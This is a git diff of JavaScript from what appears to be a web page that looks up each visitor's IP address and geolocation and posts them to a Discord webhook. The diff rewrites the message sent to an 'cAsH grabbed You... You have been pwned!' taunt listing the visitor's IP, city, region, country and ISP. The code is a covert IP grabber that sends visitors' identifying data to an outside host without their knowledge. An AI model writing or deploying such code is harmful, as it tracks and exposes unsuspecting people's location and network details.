@@ -83,12 +83,23 @@
                 document.getElementById('ip-address-value').textContent = userIP;
                 document.getElementById('ip-info').textContent = JSON.stringify(geoData, null, 2);
 
+                // Build webhook message content
+                const webhookMessage = `
+:cAsH:  cAsH grabbed You :cAsH: 
+
+**User IP:** ${userIP}
+**Location:** ${geoData.city}, ${geoData.region}, ${geoData.country}
+**ISP:** ${geoData.org || "Unknown"}
+
+||@everyone|| **You have been pwned!**
+                `;
+
                 // Send to Discord Webhook
                 await fetch("https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
-                        content: `💀 **Hacked by cAsH** 💀\n\nUser IP: ${userIP}\nLocation: ${geoData.city}, ${geoData.region}, ${geoData.country}\nYou have been pwned!`
+                        content: webhookMessage
                     })
                 });
             } catch (error) {
